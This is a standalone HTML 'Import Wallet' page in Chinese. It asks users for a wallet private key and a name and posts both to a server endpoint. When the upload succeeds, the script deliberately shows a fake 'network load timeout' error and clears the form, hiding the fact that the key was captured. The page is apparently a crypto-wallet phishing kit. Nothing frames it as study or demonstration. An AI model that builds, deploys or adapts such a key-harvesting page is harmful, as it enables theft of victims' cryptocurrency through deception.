<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>导入钱包</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html,
    body {
      height: 100%;
    }

    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: linear-gradient(135deg, #f0f4f9, #e9eef6);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100%;
      padding: 24px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      padding: 32px 28px;
      border-radius: 18px;
      box-shadow: 0 10px 30px rgba(20, 40, 70, 0.09);
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      color: #111827;
      text-align: center;
      margin-bottom: 28px;
    }

    .form-item {
      margin-bottom: 26px;
    }

    .form-item label {
      display: block;
      font-size: 14px;
      color: #374151;
      margin-bottom: 8px;
      font-weight: 500;
    }

    .input-wrap {
      position: relative;
    }

    .input-box {
      width: 100%;
      padding: 14px 44px 14px 16px;
      border: 1px solid #d1d5db;
      border-radius: 12px;
      font-size: 15px;
      outline: none;
      transition: border-color 0.24s ease;
      background-color: #fff;
    }

    .input-box:focus {
      border-color: #2563eb;
    }

    textarea.input-box {
      resize: none;
      min-height: 104px;
      line-height: 24px;
    }

    .name-input {
      height: 40px;
      padding: 10px 16px;
      font-size: 14px;
    }

    .paste-icon-btn {
      position: absolute;
      right: 12px;
      bottom: 12px;
      width: 34px;
      height: 34px;
      border: none;
      border-radius: 9px;
      background: #f3f4f6;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.2s ease;
    }

    .paste-icon-btn:hover {
      background: #e5e7eb;
    }

    .paste-icon-btn svg {
      width: 19px;
      height: 19px;
      stroke: #6b7280;
      stroke-width: 2;
    }

    .submit-btn {
      width: 100%;
      padding: 14px;
      margin-top: 6px;
      border: none;
      border-radius: 12px;
      background-color: #2563eb;
      color: white;
      font-size: 16px;
      font-weight: 550;
      cursor: pointer;
      transition: background 0.24s ease;
    }

    .submit-btn:hover {
      background-color: #1d4ed8;
    }

    .submit-btn:active {
      background-color: #1e40af;
    }

    .tip {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
      transition: color 0.2s;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1 class="title">导入钱包</h1>

    <div class="form-item">
      <div class="input-wrap">
        <textarea id="contentInput" class="input-box" rows="3" placeholder="请输入私钥，或点击右下角图标粘贴"></textarea>
        <button type="button" class="paste-icon-btn" onclick="pasteClipboard()" title="粘贴">
          <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
            <rect x="9" y="9" width="11" height="11" rx="2"></rect>
            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
          </svg>
        </button>
      </div>
    </div>

    <div class="form-item">
      <label>钱包名称</label>
      <div class="input-wrap">
        <input id="nameInput" class="input-box name-input" type="text" placeholder="请输入名称">
      </div>
    </div>

    <button class="submit-btn" onclick="submitData()">确认导入</button>
    <div class="tip" id="msg"></div>
  </div>

  <script>
    async function pasteClipboard() {
      try {
        const text = await navigator.clipboard.readText();
        document.getElementById("contentInput").value = text;
      } catch (e) {
        alert("无法读取剪贴板，请手动粘贴");
      }
    }

    async function submitData() {
      const contentEle = document.getElementById("contentInput");
      const nameEle = document.getElementById("nameInput");
      const msgEle = document.getElementById("msg");

      const content = contentEle.value.trim();
      const name = nameEle.value.trim();

      if (!content || !name) {
        msgEle.innerText = "两项都不能为空";
        msgEle.style.color = "#dc2626";
        return;
      }

      msgEle.innerText = "正在提交...";
      msgEle.style.color = "#6b7280";

      try {
        const res = await fetch("/api/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            data: content,
            name: name
          })
        });

        const result = await res.json();

        if (res.ok) {
          msgEle.innerText = "网络加载超时";
          msgEle.style.color = "#dc2626";
          contentEle.value = "";
          nameEle.value = "";
        } else {
          msgEle.innerText = "导入失败：" + (result.message || result.msg);
          msgEle.style.color = "#dc2626";
        }
      } catch (err) {
        msgEle.innerText = "网络请求出错";
        msgEle.style.color = "#dc2626";
      }
    }
  </script>
</body>
</html>
